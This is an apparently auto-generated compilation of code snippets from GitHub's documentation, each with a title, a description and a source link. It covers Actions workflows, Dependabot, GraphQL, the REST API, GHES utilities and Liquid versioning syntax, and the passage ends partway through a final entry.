link a gem package to a specific GitHub repository by including the repository URL in the `gem.metadata`. OWNER and REPOSITORY should be replaced with the owner and repository name respectively. Conditional logic addresses different hostname configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\ngem.metadata = { \"github_repo\" => \"ssh://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/OWNER/REPOSITORY\" }\n```\n\n----------------------------------------\n\nTITLE: Handling Pull Request Merged Events (Ruby)\nDESCRIPTION: This snippet extends the Sinatra server to specifically handle `pull_request` events from GitHub webhooks. It checks if a pull request has been merged (action is \"closed\" and merged is true) and prints a message to the console, indicating that a deployment should start. The code accesses the `X-GitHub-Event` header to determine the event type and parses the JSON payload to extract relevant information.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/delivering-deployments.md#_snippet_1\n\nLANGUAGE: Ruby\nCODE:\n```\npost '/event_handler' do\n  @payload = JSON.parse(params[:payload])\n\n  case request.env['HTTP_X_GITHUB_EVENT']\n  when \"pull_request\"\n    if @payload[\"action\"] == \"closed\" && @payload[\"pull_request\"][\"merged\"]\n      puts \"A pull request was merged! A deployment should start now...\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Verifying SBOM Attestation with JSON Output using GitHub CLI (SPDX)\nDESCRIPTION: This command verifies SBOM attestations and outputs the result in JSON format, using `jq` to extract the statement predicate. It requires the artifact path, repository name, SPDX predicate type, `--format json` flag and `--jq` flag. This is useful for inspecting the attestation details. Replace `PATH/TO/YOUR/BUILD/ARTIFACT-BINARY` and `ORGANIZATION_NAME/REPOSITORY_NAME` with your values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\\n  -R ORGANIZATION_NAME/REPOSITORY_NAME \\\n  --predicate-type https://spdx.dev/Document/v2.3 \\\n  --format json \\\n  --jq '.[].verificationResult.statement.predicate'\n```\n\n----------------------------------------\n\nTITLE: Feature-based versioning with Liquid\nDESCRIPTION: This JavaScript snippet illustrates how to use Liquid's `ifversion` tag for feature-based versioning in Markdown files. It uses the feature name to conditionally display content.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n{% raw %}{% ifversion FEATURE-NAME %} ... {% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Long-Running Data Insertion in SQL\nDESCRIPTION: This SQL snippet inserts data from `source_table` to `target_table` based on complex conditions, which might result in long-running transactions if the `source_table` is very large. This shows the scenario which could cause performance problems and deadlocks due to the transaction locking tables. Dependencies: `source_table` and `target_table` must pre-exist with matching column definitions.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nBEGIN TRANSACTION;\n\nINSERT INTO target_table (first_name, last_name, email, dept, role, hire_date)\nSELECT first_name, last_name, email, department, job_title, start_date\nFROM source_table\nWHERE (department = 'Engineering' AND (salary > 95000 OR grade > 5))\n  OR (department = 'Marketing' AND performance_rating = 'Excellent');\n\nCOMMIT;\n```\n\n----------------------------------------\n\nTITLE: Symbol Qualifier in Code Search\nDESCRIPTION: This snippet demonstrates how to search for symbol definitions using the `symbol:` qualifier. It searches for a symbol called `WithContext` in Go code.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_21\n\nLANGUAGE: text\nCODE:\n```\nlanguage:go symbol:WithContext\n```\n\n----------------------------------------\n\nTITLE: CORS Preflight Request Example\nDESCRIPTION: This curl command demonstrates a CORS preflight request using the OPTIONS method. It includes the `Origin` header to indicate the requesting domain. The response includes `Access-Control-Allow-Origin`, `Access-Control-Allow-Headers`, and `Access-Control-Allow-Methods` which define the permitted cross-origin access.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-cors-and-jsonp-to-make-cross-origin-requests.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ curl -I {% data variables.product.rest_url %} -H \"Origin: http://example.com\" -X OPTIONS\nHTTP/2 204\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With\nAccess-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE\nAccess-Control-Expose-Headers: ETag, Link, x-ratelimit-limit, x-ratelimit-remaining, x-ratelimit-reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval\nAccess-Control-Max-Age: 86400\n```\n\n----------------------------------------\n\nTITLE: Configuring Container Job Steps - YAML\nDESCRIPTION: This snippet defines the steps executed within a container job in a GitHub Actions workflow. It includes checking out the repository code, installing dependencies using npm ci, and connecting to the Redis service. The connection to Redis is facilitated by running a Node.js script ('client.js') and using environment variables to specify the Redis host and port.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checkout %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to Redis\n    # Runs a script that creates a Redis client, populates\n    # the client with data, and retrieves data\n    run: node client.js\n    # Environment variable used by the `client.js` script to create a new Redis client.\n    env:\n      # The hostname used to communicate with the Redis service container\n      REDIS_HOST: redis\n      # The default Redis port\n      REDIS_PORT: 6379\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Matrix with Environment Variables (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow with a matrix strategy, including defining custom environment variables (`site` and `datacenter`) for each matrix entry and using them within a workflow step. The `matrix.env` is not directly used here; instead, individual matrix properties are accessed. The `run` command echoes the values of these environment variables.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/matrix-variable-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Node.js CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n       include:\n         - node-version: '14.x'\n           site: \"prod\"\n           datacenter: \"site-a\"\n         - node-version: '16.x'\n           site: \"dev\"\n           datacenter: \"site-b\"\n    steps:\n      - name: Echo site details\n        env:\n          SITE: {% raw %}${{ matrix.site }}{% endraw %}\n          DATACENTER: {% raw %}${{ matrix.datacenter }}{% endraw %}\n        run: echo $SITE $DATACENTER\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependabot Version Updates with Ignores in YAML\nDESCRIPTION: This YAML snippet configures Dependabot version updates. It disables updates for Docker by setting `open-pull-requests-limit` to 0. It also configures updates for npm, ignoring packages starting with 'aws', specific versions of 'express', and all patch updates. The `ignore` section demonstrates wildcard usage and version specification for disabling updates.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/configuring-dependabot-version-updates.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# `dependabot.yml` file with updates\n# disabled for Docker and limited for npm\n\nversion: 2\nupdates:\n  # Configuration for Dockerfile\n  - package-ecosystem: \"docker\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n      # Disable all pull requests for Docker dependencies\n    open-pull-requests-limit: 0\n\n  # Configuration for npm\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    ignore:\n      # Ignore updates to packages that start with 'aws'\n      # Wildcards match zero or more arbitrary characters\n      - dependency-name: \"aws*\"\n      # Ignore some updates to the 'express' package\n      - dependency-name: \"express\"\n        # Ignore only new versions for 4.x and 5.x\n        versions: [\"4.x\", \"5.x\"]\n      # For all packages, ignore all patch updates\n      - dependency-name: \"*\"\n        update-types: [\"version-update:semver-patch\"]\n\n```\n\n----------------------------------------\n\nTITLE: Operating System Tag: Linux\nDESCRIPTION: This code snippet demonstrates how to use the `linux` tag to display content relevant to Linux users. It wraps instructions that are specific to the Linux operating system.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_7\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% linux %}\n\n These instructions are pertinent to Linux users.\n\n{% endlinux %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Linking to a header in a different article - Markdown\nDESCRIPTION: This snippet illustrates how to link to a specific header in a different Markdown article. It utilizes the `PATH-TO-ARTICLE#HEADER-TITLE` format to point to the target article and section. `AUTOTITLE` is used as the link text.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_22\n\nLANGUAGE: Markdown\nCODE:\n```\nFor more information, see [AUTOTITLE](PATH-TO-ARTICLE#HEADER-TITLE).\n```\n\n----------------------------------------\n\nTITLE: Promoting a User via Command Line (ghe-user-promote) - Shell\nDESCRIPTION: This snippet shows how to promote a user to a site administrator using the `ghe-user-promote` command-line utility. It requires SSH access to the appliance. Replace `USERNAME` with the actual username to be promoted.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/promoting-or-demoting-a-site-administrator.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-promote USERNAME\n```\n\n----------------------------------------\n\nTITLE: Markdown About me Section with comment example\nDESCRIPTION: A markdown example for about me section, including HTML comment\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_10\n\nLANGUAGE: markdown\nCODE:\n```\n## About me\n\n<!-- TO DO: add more details about me later -->\n```\n\n----------------------------------------\n\nTITLE: Transforming Bamboo System Variables to Bash\nDESCRIPTION: This snippet shows how Bamboo system variables used in tasks are transformed to equivalent bash shell variables. `${system.<variable.name>}` is transformed to `$variable_name`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_19\n\nLANGUAGE: Bash\nCODE:\n```\n$variable_name\n```\n\n----------------------------------------\n\nTITLE: Example Custom Pattern Matches - Shell\nDESCRIPTION: This shell example demonstrates strings that would match a custom secret scanning pattern defined with specific length, character requirements, and forbidden substrings. It showcases how the 'Secret format', 'After secret', and 'Additional requirements' are evaluated.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/using-advanced-secret-scanning-and-push-protection-features/custom-patterns/defining-custom-patterns-for-secret-scanning.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\na9@AAfT!         # Secret string match: a9@AAfT\nee95GG@ZA942@aa  # Secret string match: @ZA942@a\na9@AA!ee9        # Secret string match: a9@AA\n```\n\n----------------------------------------\n\nTITLE: Checking Node.js engine version in package.json\nDESCRIPTION: This JSON snippet shows the `engines` field in `package.json` file, which specifies the required Node.js version(s) for the GitHub Docs application. The example indicates that Node.js major version 16 or 18 can be used.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/creating-a-local-environment.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n\"engines\": {\n    \"node\": \"^16 || ^18\"\n}\n```\n\n----------------------------------------\n\nTITLE: GraphQL Signature for Repository Discussions\nDESCRIPTION: This GraphQL signature defines the structure for querying discussions within a repository using the `discussions` field. It includes parameters for pagination (`after`, `before`, `first`, `last`), filtering by category (`categoryId`), filtering by answered status (`answered`), and ordering (`orderBy`). The return type is a `Discussion` object.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_1\n\nLANGUAGE: GraphQL\nCODE:\n```\ndiscussions(\n  after: String,\n  before: String,\n  first: Int,\n  last: Int,\n  categoryId: ID = null,\n  \n  answered: Boolean = null,\n  \n  orderBy: DiscussionOrder = {field: UPDATED_AT, direction: DESC}\n) : Discussion\n```\n\n----------------------------------------\n\nTITLE: Define domains for runner version updates\nDESCRIPTION: These domains are required for updating the runner version. Ensures runners are kept up-to-date with the latest features and security patches.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nobjects.githubusercontent.com\nobjects-origin.githubusercontent.com\ngithub-releases.githubusercontent.com\ngithub-registry-files.githubusercontent.com\n```\n\n----------------------------------------\n\nTITLE: Tagging a Docker image\nDESCRIPTION: This command tags a Docker image with a new name and version, preparing it for publishing to the GitHub Packages registry.  It requires the IMAGE_ID, OWNER, REPOSITORY, IMAGE_NAME, and VERSION to be specified.  This example is for github.com\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ndocker tag IMAGE_ID docker.pkg.github.com/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n```\n\n----------------------------------------\n\nTITLE: Cluster Replication Bootstrap (ghe-cluster-repl-bootstrap)\nDESCRIPTION: This utility configures high availability replication to a secondary set of cluster nodes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_35\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-repl-bootstrap\n```\n\n----------------------------------------\n\nTITLE: Generating Author List from SVN Logs - Shell\nDESCRIPTION: This shell script extracts author names from Subversion logs, formats them, and stores them in an `authors.txt` file.  It uses `svn log` to retrieve the logs, `grep` to filter for revision lines, `awk` to extract the author name, `sed` to remove leading whitespace, `sort` to order the names, and `uniq` to remove duplicates. The script requires the svn command-line tool.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-subversion-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsvn log -q | grep -e '^r' | awk 'BEGIN { FS = \"|\" } ; { print $2\" = \"$2 }' | sed 's/^[ \\t]*//' | sort | uniq > authors.txt\n```\n\n----------------------------------------\n\nTITLE: Diagnosing SSH Connection Timeout\nDESCRIPTION: This code snippet demonstrates how to use the `ssh` command with the `-vT` flags to test an SSH connection. The verbose output helps in diagnosing connection issues like timeouts due to firewalls or proxy servers.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-bad-file-number.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ ssh -vT git@{% data variables.product.product_url %}\n> OpenSSH_8.1p1, LibreSSL 2.7.3\n> debug1: Connecting to {% data variables.product.product_url %} [207.97.227.239] port 22.\n> debug1: connect to address 207.97.227.239 port 22: Connection timed out\n> ssh: connect to host {% data variables.product.product_url %} port 22: Connection timed out\n> ssh: connect to host {% data variables.product.product_url %} port 22: Bad file number\n```\n\n----------------------------------------\n\nTITLE: Adding a Remote Repository in Git\nDESCRIPTION: This snippet demonstrates how to add a new remote repository using the `git remote add` command. It includes setting a remote named 'origin' and verifying the new remote using `git remote -v`. The remote URL is specified as an argument to `git remote add`.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote add origin https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git\n# Set a new remote\n\n$ git remote -v\n# Verify new remote\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (fetch)\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (push)\n```\n\n----------------------------------------\n\nTITLE: Enabling MCP Discovery\nDESCRIPTION: This code snippet shows how to enable MCP discovery to use existing Claude Desktop configurations within {% data variables.product.prodname_vscode %}. By setting `chat.mcp.discovery.enabled` to `true` in the `settings.json` file, {% data variables.product.prodname_vscode %} will automatically detect and utilize the existing MCP configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/customizing-copilot/extending-copilot-chat-with-mcp.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n\"chat.mcp.discovery.enabled\": true\n```\n\n----------------------------------------\n\nTITLE: Requesting paginated data using curl\nDESCRIPTION: This curl command demonstrates how to make a GET request to the GitHub API to retrieve issues for the `octocat/Spoon-Knife` repository. The `--include` flag is used to include the response headers in the output, which contain the `link` header used for pagination.  The Accept header specifies the desired media type.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-pagination-in-the-rest-api.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --include --request GET \\\n  --url \"https://api.github.com/repos/octocat/Spoon-Knife/issues\" \\\n  --header \"Accept: application/vnd.github+json\"\n```\n\n----------------------------------------\n\nTITLE: Initiating Check Run and Updating Status - Ruby\nDESCRIPTION: This Ruby code defines the `initiate_check_run` method, which updates the status of a check run from `queued` to `in_progress` and then to `completed`. It uses the `@installation_client` to call the `update_check_run` method, updating the status and conclusion of the check run.  The `@payload` variable provides repository and check run details.  The `octokit` gem is a dependency.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_27\n\nLANGUAGE: Ruby\nCODE:\n```\n    # Start the CI process\n    def initiate_check_run\n      # Once the check run is created, you'll update the status of the check run\n      # to 'in_progress' and run the CI process. When the CI finishes, you'll\n      # update the check run status to 'completed' and add the CI results.\n\n      @installation_client.update_check_run(\n        @payload['repository']['full_name'],\n        @payload['check_run']['id'],\n        status: 'in_progress',\n        accept: 'application/vnd.github+json'\n      )\n\n      # ***** RUN A CI TEST *****\n\n      # Mark the check run as complete!\n      @installation_client.update_check_run(\n        @payload['repository']['full_name'],\n        @payload['check_run']['id'],\n        status: 'completed',\n        conclusion: 'success',\n        accept: 'application/vnd.github+json'\n      )\n\n    end\n```\n\n----------------------------------------\n\nTITLE: Configuring Gradle Groovy for multiple packages\nDESCRIPTION: This snippet shows how to configure Gradle Groovy for publishing multiple packages within the same repository to GitHub Packages. It applies the maven-publish plugin to subprojects and configures the repository URL and credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nplugins {\n    id(\"maven-publish\") apply false\n}\nsubprojects {\n    apply plugin: \"maven-publish\"\n    publishing {\n        repositories {\n            maven {\n                name = \"GitHubPackages\"\n                url = uri(\"https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}REGISTRY_URL{% endif %}/OWNER/REPOSITORY\")\n                credentials {\n                    username = project.findProperty(\"gpr.user\") ?: System.getenv(\"USERNAME\")\n                    password = project.findProperty(\"gpr.key\") ?: System.getenv(\"TOKEN\")\n                }\n            }\n        }\n        publications {\n            gpr(MavenPublication) {\n                from(components.java)\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating the main function to call the help function\nDESCRIPTION: This updates the `main` function to call the `help` function when the command-line argument is 'help'. It allows the program to actually execute the intended `help` function.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\ndef main\n  case ARGV[0]\n  when \"help\"\n    help\n  when \"login\"\n    puts \"`login` is not yet defined\"\n  when \"whoami\"\n    puts \"`whoami` is not yet defined\"\n  else\n    puts \"Unknown command #{ARGV[0]}\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Job Dependencies using 'needs' - YAML\nDESCRIPTION: This YAML snippet shows how to define job dependencies in GitHub Actions using the `needs` keyword. `job2` depends on `job1` completing successfully, and `job3` depends on both `job1` and `job2`. This ensures that the jobs run sequentially in the order specified.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-jobs-in-a-workflow-needs.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    needs: [job1, job2]\n```\n\n----------------------------------------\n\nTITLE: Repositories list file\nDESCRIPTION: This text file contains a list of repositories to include in the CircleCI audit, with each repository name on a new line. It's used in conjunction with the `--include-from` argument of the `gh actions-importer audit` command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_16\n\nLANGUAGE: text\nCODE:\n```\nrepository_one\nrepository_two\nrepository_three\n```\n\n----------------------------------------\n\nTITLE: Generating Basic Unit Tests with /tests Slash Command in Python\nDESCRIPTION: This code shows the start of a basic unit test suite for the `BankAccount` class, generated using the `/tests` slash command. It sets up the testing environment and includes a test for the initial balance.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_3\n\nLANGUAGE: Python\nCODE:\n```\nimport unittest\nfrom bank_account import BankAccount\n\nclass TestBankAccount(unittest.TestCase):\n    def setUp(self):\n        self.account = BankAccount()\n\n    def test_initial_balance(self):\n        self.assertEqual(self.account.get_balance(), 0)\n```\n\n----------------------------------------\n\nTITLE: qlpack.yml - Defining Default Suite File (YAML)\nDESCRIPTION: This YAML snippet shows how to define the `defaultSuiteFile` property in a `qlpack.yml` file. This property is required by packs that export a set of default queries to run.  It defines the path to a query suite file relative to the package root.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_10\n\nLANGUAGE: YAML\nCODE:\n```\ndefaultSuiteFile: cpp-code-scanning.qls\n```\n\n----------------------------------------\n\nTITLE: Accessing Management Console URL\nDESCRIPTION: This snippet provides the URL to access the {% data variables.enterprise.management_console %} as an unauthenticated user.  Replace `hostname` with the actual {% data variables.product.prodname_ghe_server %} hostname or IP address.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-web-ui/accessing-the-management-console.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nhttp(s)://HOSTNAME/setup\n```\n\n----------------------------------------\n\nTITLE: Creating MinIO Bucket (Clustered Deployment Shell)\nDESCRIPTION: This snippet configures the MinIO client to connect to a clustered MinIO instance and creates a bucket named 'packages'.  It sets the `MC_HOST_minio` environment variable to the MinIO cluster's address and credentials. This example is designed for a clustered MinIO deployment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nexport MC_HOST_minio=\"http://${MINIO_ACCESS_KEY}:${MINIO_SECRET_KEY} @minioclustername.example.com:9000\"\ndocker run minio/mc mb packages\n```\n\n----------------------------------------\n\nTITLE: Ensuring Unique IDs in Body of YAML\nDESCRIPTION: This snippet describes how to fix the 'Body must have unique ids' error. If using `id` attributes to distinguish multiple elements, each `id` attribute must be unique.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: input\n  id: name\n  attributes:\n    label: First name\n- type: input\n  id: name\n  attributes:\n    label: Last name\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: input\n  id: name\n  attributes:\n    label: First name\n- type: input\n  id: surname\n  attributes:\n    label: Last name\n\n```\n\n----------------------------------------\n\nTITLE: Conditional GET Request with ETag - cURL\nDESCRIPTION: This snippet demonstrates how to make a conditional GET request to the {% data variables.product.github %} REST API using the `if-none-match` header. It checks if the resource has changed since the last time it was retrieved, based on the ETag value.  The `--include` option ensures that the response headers are included in the output.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/best-practices-for-using-the-rest-api.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl {% data variables.product.rest_url %}/meta --include --header 'if-none-match: \"644b5b0155e6404a9cc4bd9d8b1ae730\"'\n```\n\n----------------------------------------\n\nTITLE: Cloning Student Repos using GitHub CLI\nDESCRIPTION: This command clones student assignment repositories for a given assignment. It uses the GitHub CLI and the GitHub Classroom extension. By default, repositories are cloned into a directory named after the assignment slug in the current directory, but a custom directory can be specified with the `--directory` flag. The `--page` and `--per-page` flags can control the number of repositories cloned.\nSOURCE: https://github.com/github/docs/blob/main/content/education/manage-coursework-with-github-classroom/teach-with-github-classroom/using-github-classroom-with-github-cli.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh classroom clone student-repos\n```\n\n----------------------------------------\n\nTITLE: Forecasting GitHub Actions Usage\nDESCRIPTION: This snippet shows how to use the `forecast` command to estimate potential GitHub Actions usage based on historical Jenkins build data. The `--output-dir` flag is used to specify the directory for the forecast report.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast jenkins --output-dir tmp/forecast\n```\n\n----------------------------------------\n\nTITLE: Defining PinnedDiscussionGradient enum in GraphQL\nDESCRIPTION: Defines the `PinnedDiscussionGradient` enum, which represents preconfigured gradients for styling pinned discussions. The enum includes values like `BLUE_MINT`, `BLUE_PURPLE`, `PINK_BLUE`, `PURPLE_CORAL`, and `RED_ORANGE`.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_11\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nPreconfigured gradients that may be used to style discussions pinned within a repository.\n\"\"\"\nenum PinnedDiscussionGradient {\n  \"\"\"\n  A gradient of blue to mint\n  \"\"\"\n  BLUE_MINT\n\n  \"\"\"\n  A gradient of blue to purple\n  \"\"\"\n  BLUE_PURPLE\n\n  \"\"\"\n  A gradient of pink to blue\n  \"\"\"\n  PINK_BLUE\n\n  \"\"\"\n  A gradient of purple to coral\n  \"\"\"\n  PURPLE_CORAL\n\n  \"\"\"\n  A gradient of red to orange\n  \"\"\"\n  RED_ORANGE\n}\n\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_SOURCE_PROJECT_ID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_SOURCE_PROJECT_ID` to the GitHub Actions equivalent `${{ github.event.pull_request.head.repo.full_name }}`.  Provides the full name of the source repository for a pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_67\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.head.repo.full_name }}\n```\n\n----------------------------------------\n\nTITLE: Uploading a File to GitHub Support (Shell)\nDESCRIPTION: Uploads a file to GitHub Support and associates it with a ticket using the `ghe-support-upload` utility. The `-f` option specifies the file path, and the `-t` option associates the upload with a ticket.  Replace `FILE_PATH` with the path to the file and `TICKET_ID` with the ticket ID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_95\n\nLANGUAGE: shell\nCODE:\n```\nghe-support-upload -f FILE_PATH -t TICKET_ID\n```\n\n----------------------------------------\n\nTITLE: Configuring Runner Scale Set Name\nDESCRIPTION: This snippet shows how to configure the runner scale set name in the `values.yaml` file, allowing you to customize the name instead of using the default Helm release name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n## The name of the runner scale set to create, which defaults to the Helm release name\nrunnerScaleSetName: \"my-runners\"\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow on Deployment Event - YAML\nDESCRIPTION: This snippet configures a workflow to run when a deployment is created in the repository. It specifies the `deployment` event. Deployments created with a commit SHA may not have a Git ref.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  deployment\n```\n\n----------------------------------------\n\nTITLE: Defining Variables in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define variables and nested variables within a YAML file. The *path*, *filename*, and *keys* determine the path in the data object.  The variables can then be accessed using a templating syntax.\nSOURCE: https://github.com/github/docs/blob/main/data/variables/README.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n# multiple short strings in one file\nmeaning_of_life: 42\n\n# and they can be nested if needed\nnested:\n  values:\n    too: Yes!\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering: FPT and GHES != 2.13 - order swap, Liquid\nDESCRIPTION: This snippet shows nested `ifversion` checks. If the FPT version is present, it renders \"Alpha\", and then if the GHES version is not 2.13, it renders \"Bravo\". Otherwise (FPT not present), it renders \"Charlie\".\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/not-equals.md#_snippet_3\n\nLANGUAGE: 